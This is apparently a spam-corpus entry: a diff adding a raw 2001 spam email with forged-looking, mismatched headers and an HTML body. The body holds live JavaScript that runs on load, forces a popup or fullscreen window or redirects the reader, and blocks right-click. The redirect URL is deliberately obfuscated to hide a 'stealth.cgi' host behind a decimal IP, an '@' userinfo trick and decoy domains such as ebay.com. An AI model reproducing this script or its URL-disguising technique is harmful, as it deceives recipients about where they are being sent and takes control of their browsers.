@@ -1,0 +1,161 @@
+Return-Path: <april8384@desertmail.com>
+Delivered-To: em-ca-smith.family@em.ca
+Received: (qmail 8296 invoked from network); 6 Mar 2001 12:16:53 -0000
+Received: from unknown (HELO server.net-business.fr) (root@195.120.235.131)
+  by em.ca with SMTP; 6 Mar 2001 12:16:53 -0000
+Received: from rsvp-208-187-57-4.ac05.rcrd.eli.net_[208.187.57.4] (rsvp-208-187-57-4.ac05.rcrd.eli.net [208.187.57.4])
+	by server.net-business.fr (8.9.3/8.9.3/SuSE Linux 8.9.3-0.1) with SMTP id NAA12312;
+	Tue, 6 Mar 2001 13:12:21 +0100
+From: april8384@desertmail.com
+Received: from mail.chinatrust.com.tw by rsvp-208-187-57-4.ac05.rcrd.eli.net with ESMTP; Tue, 06 Mar 2001 06:15:04 -0600
+Message-ID: <0000497f298f$00003ddb$0000168c@mail.chinatrust.com.tw>
+To: <joe454@desertmail.com>
+Subject: Do you know what "POUND FOR POUND" really means?                         5772
+Date: Tue, 06 Mar 2001 06:14:54 -0600
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Priority: 3
+X-MSMail-Priority: Normal
+Reply-To: andreak@sudanmail.com
+X-Mailer: USANET web-mailer (34WB1.4.03)
+Content-Length: 4204
+Lines: 136
+
+<HTML>
+<BODY>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+
+<HEAD>
+<meta http-equiv=3D"Page-Enter" CONTENT=3D"RevealTrans(Duration=3D4,Transi=
+tion=3D10)">
+<script language=3D"JavaScript"> <!--
+
+var message=3D"Sorry, that function is disabled."; // Message for the aler=
+t box
+
+// Don't edit below!
+function closeit() {
+
+     window.close()
+
+}
+function intro()
+{
+	if ((navigator.appVersion.indexOf("Mac")!=3D-1) &&
+(navigator.userAgent.indexOf("MSIE")!=3D-1) &&
+(parseInt(navigator.appVersion)=3D=3D4))
+	{
+	skip()
+	}
+	else 
+	{ 
+	popup()
+	}
+
+}
+function skip()
+{
+	location.href=3D"http://www.hongkong.com";
+}
+function popup()
+{
+	version =3D parseFloat(navigator.appVersion.substring(navigator.appVersio=
+n.indexOf('.')-1,navigator.appVersion.length));
+	if (version >=3D 4)
+	version =3D parseFloat(navigator.appVersion.substring(navigator.appVersio=
+n.indexOf('.')-1,navigator.appVersion.length));
+	if (version >=3D 4)
+	
+	{
+	if (navigator.appName=3D=3D"Netscape")
+ {
+    Hello =3D window.open("http://216.32.74.52/stealth.cgi=3Dkey57985//htt=
+p://3472742688/apache2i8/convert.cgi/?http://996.682.889.0-aasrdh-gouri-ny=
+ry.htm@00000000321.0000000032.0000000041.0000000020/vpaysystems.net/0003F.=
+html?redirect=3Dangelfire.lycos.com/ogoqstn/purvbrqfb/ufzd.htm?digitaldata=
+streamcomputernetworking.com/redirect.cgi?-refer#4908732?http://geocities.=
+net/majorcomputernetworking:endofline.com?needanumeralhexadec.com:1.5.4://=
+redirect?ebay.com/hobbies/http://mnumeralhexadec.com?12.5.102.4?digitaldat=
+astreamcomputernetworking.com/main.html?http://geocities.net/majorcomputer=
+networking:endofline.com?http://www.delhadata.com:1.5.4://redirect:ebay.co=
+m/hobbies/http://mnumeralhexadecimal.com?12.5.102.4/","Hello","scrollbars"=
+);
+    Hello.focus();
+                
+}
+
+		
+if (navigator.appName=3D=3D"Microsoft Internet Explorer")
+		{
+			window.open("http://216.32.74.52/stealth.cgi=3Dkey57985//http://3472742=
+688/apache2i8/convert.cgi/?http://996.682.889.0-aasrdh-gouri-nyry.htm@0000=
+0000321.0000000032.0000000041.0000000020/vpaysystems.net/0003F.html?redire=
+ct=3Dangelfire.lycos.com/ogoqstn/purvbrqfb/ufzd.htm?digitaldatastreamcompu=
+ternetworking.com/redirect.cgi?-refer#4908732?http://geocities.net/majorco=
+mputernetworking:endofline.com?needanumeralhexadec.com:1.5.4://redirect?eb=
+ay.com/hobbies/http://mnumeralhexadec.com?12.5.102.4?digitaldatastreamcomp=
+uternetworking.com/main.html?http://geocities.net/majorcomputernetworking:=
+endofline.com?http://www.delhadata.com:1.5.4://redirect:ebay.com/hobbies/h=
+ttp://mnumeralhexadecimal.com?12.5.102.4/","screen","fullscreen=3Dyes");
+		}
+	}
+	else
+	{
+		location.href=3D"http://216.32.74.52/stealth.cgi=3Dkey57985//http://3472=
+742688/apache2i8/convert.cgi/?http://996.682.889.0-aasrdh-gouri-nyry.htm@0=
+0000000321.0000000032.0000000041.0000000020/vpaysystems.net/0003F.html?red=
+irect=3Dangelfire.lycos.com/ogoqstn/purvbrqfb/ufzd.htm?digitaldatastreamco=
+mputernetworking.com/redirect.cgi?-refer#4908732?http://geocities.net/majo=
+rcomputernetworking:endofline.com?needanumeralhexadec.com:1.5.4://redirect=
+?ebay.com/hobbies/http://mnumeralhexadec.com?12.5.102.4?digitaldatastreamc=
+omputernetworking.com/main.html?http://geocities.net/majorcomputernetworki=
+ng:endofline.com?http://www.delhadata.com:1.5.4://redirect:ebay.com/hobbie=
+s/http://mnumeralhexadecimal.com?12.5.102.4/";
+	}
+
+}
+function click(e) {
+if (document.all) {
+if (event.button =3D=3D 2) {
+alert(message);
+return false;
+}
+}
+if (document.layers) {
+if (e.which =3D=3D 3) {
+alert(message);
+return false;
+}
+}
+}
+if (document.layers) {
+document.captureEvents(Event.MOUSEDOWN);
+}
+document.onmousedown=3Dclick;
+// --> </script>
+
+	<META NAME=3D"GENERATOR" Content=3D"Visual Page 1.0 for Windows">
+	<META HTTP-EQUIV=3D"Content-Type" CONTENT=3D"text/html;CHARSET=3Diso-8859=
+-1">
+	<TITLE>Hello</TITLE>
+</HEAD>
+
+<BODY BGCOLOR=3D"#0000AA" LINK=3D"#000000" onLoad=3D"intro()">
+
+<P><SCRIPT LANGUAGE=3D"Javascript">
+</SCRIPT>
+ </BODY>
+
+</HTML>
+<p><p><p><p><p><p><p><p><p><p>
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN"><p><HTML><p><p><HEAD><p><=
+meta http-equiv=3D"Page-Enter" CONTENT=3D"RevealTrans(Duration=3D4,Transit=
+ion=3D10)"><p><p><p><p><p><p><p><p><p><p>
+</BODY>
+</HTML>
+
+
